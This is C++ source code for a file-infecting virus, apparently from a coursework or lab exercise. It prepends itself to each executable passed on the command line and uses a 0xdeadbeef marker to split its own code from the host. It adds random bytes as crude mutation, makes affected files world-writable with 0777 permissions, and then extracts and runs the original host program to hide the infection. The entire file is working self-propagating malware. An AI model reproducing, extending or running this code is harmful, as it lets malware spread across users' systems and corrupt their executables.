#include <iostream>
#include <fstream>
#include <random>
#include <ctime>
#include <string>
#include <cstring>
#include <cstdlib>
#include <sys/stat.h>
#include <unistd.h>
#include <cstdio>

const u_int32_t SENTVAL = 0xdeadbeef;

using namespace std;

bool infect(string& virusPath, string& infectedPath, string& victimPath){
    
    FILE* virusFile;
    FILE* infectedFile;
    FILE* victimFile;
    
    virusFile = fopen(virusPath.c_str(), "r");
    if(!virusFile){
        cerr<<"cannot open virusFile";
        return false;
    }
    infectedFile = fopen(infectedPath.c_str(), "w");
    victimFile = fopen(victimPath.c_str(), "r");

    u_int8_t byteC = 0;
    u_int8_t markerFound = 0;

    //looking for marker
    while(fread(&byteC, 1, 1, virusFile) == 1 && markerFound < 4){
        switch(markerFound){
            case 0:
                if(byteC == 0xde){ markerFound++;}
                break;
            case 1:
                if(byteC == 0xad){markerFound++;}
                else{markerFound=0;}
                break;
            case 2:
                if(byteC == 0xbe){markerFound++;}
                else{markerFound=0;}
                break;
            case 3:
                if(byteC == 0xef){markerFound++;}
                else{markerFound=0;}
                break;
            default:
                break;
        }
        //writing everything including marker to infected file
        fwrite(&byteC, 1, 1, infectedFile);
    }

    u_int64_t debug = 0;

    //adding random bytes to "mutate" the virus
    srand(time(0));

    for(int i = 0; i < 4; i++){
        uint8_t rb = rand()%256;
        fwrite(&rb, sizeof(rb), 1, infectedFile);
    }

    while(!(feof(victimFile))){
        //read byte into byteC
        debug = fread(&byteC, 1, 1, victimFile);
        if(debug != 1 && debug != 0){
            cout<<"bad fread\n";
            cout<<debug<<"\n";
            break;
        }
        //write byteC into infectedFile
        debug = fwrite(&byteC, 1, 1, infectedFile);
        if(debug != 1 && debug != 0){
            cout<<"bad fread\n";
            cout<<debug<<"\n";
            break;
        }
    }
    
    fclose(victimFile);
    fclose(virusFile);
    fclose(infectedFile);
    chmod(victimPath.c_str(), 0777);
    chmod(infectedPath.c_str(), 0777);
    chmod(virusPath.c_str(), 0777);
    return true;
}




//takes the file after the 0xdeadbeef and makes a temporary file from it
//returns true if file is created
bool makeTmp (const string& f1, const string& f2){
    //creating tmp file
    FILE* rfile;
    FILE* hostx;
    rfile = fopen(f1.c_str(), "rb");
    if(!rfile){
        cerr<<"could not open file "<<f1<<"\n";
        return false;
    }
    hostx = fopen(f2.c_str(), "wb");
    if(!hostx){
        cerr<<"could not create temp file "<<f2<<"\n";
    }
    chmod(f1.c_str(), 0777);
    chmod(f2.c_str(), 0777);
    u_int8_t bc = 0;
    size_t br;
    bool found = false;
    u_int8_t marker = 0;
    u_int64_t debug = 0;
    while((br = fread(&bc, 1, 1, rfile))==1){
        //printf("Read byte: 0x%02x\n", bc);
        //Searching for marker 0xdeadbeef, stop reading if marker is found
        if(!found){
            switch(marker){
                case 0:
                    if(bc == 0xde){ marker++;}
                    break;
                case 1:
                    if(bc == 0xad){marker++;}
                    else{marker=0;}
                    break;
                case 2:
                    if(bc == 0xbe){marker++;}
                    else{marker=0;}
                    break;
                case 3:
                    cout<<marker<<"\n";
                    if(bc == 0xef){marker++; found = true;
                        //skipping random bytes after marker to get to the ELF marker
                        while (1){
                            debug = fread(&bc, 1, 1, rfile);
                            //printf("reading byte: 0x%02x\n", bc);

                            if (bc == 0x7F)
                            {
                                break;
                            }
                            if (debug == 0)
                            {
                                break;
                            }
                        }
                    break;
                    }
                    else{marker=0;}
                    break;
            }
        }
        if(found){
            
            //write everything after the marker is found
            if (fwrite(&bc, 1, 1, hostx) != 1) {
                cerr << "Error writing to " << f2 << "\n";
                fclose(rfile);
                fclose(hostx);
                return false;
            }
        }        
    }
    if(!found){
        cerr<<"deadbeef not found in "<<f1<<"\n";
        fclose(rfile);
        fclose(hostx);
        return false;
    }
    fclose(rfile);
    fclose(hostx);
    chmod(f2.c_str(), 0777);
    //cout <<"host file created at: "<<f2<<"\n";
    return true;
}



int main (int argc, char *argv[]){
    string hostP = "./hostx";
    system("rm ./hostx");
    if(!makeTmp(argv[0], hostP)){
        cerr<<"could not make file\n";
        exit(0);
    }
    for(int i = 1; i < argc; i++){
        string tmpFileName = "./tmp";
        chmod(argv[i], 0777);
        rename(argv[i], tmpFileName.c_str());
        string s1(argv[0]);
        string s2(argv[i]);
        //cout<<s1<<"\n";
        //cout<<s2<<"\n";
        chmod(tmpFileName.c_str(), 0777);
        infect(s1, s2, tmpFileName);
        chmod(argv[i], 0777);
        chmod(tmpFileName.c_str(), 0777);
        //execl(tmpFileName.c_str(), hostP.c_str());
        remove(tmpFileName.c_str());
    }
    chmod(hostP.c_str(), 0777);
    
    if(execv(hostP.c_str(), argv)==-1){
        cerr<<"cant execute program";
        return 1;
    }
}
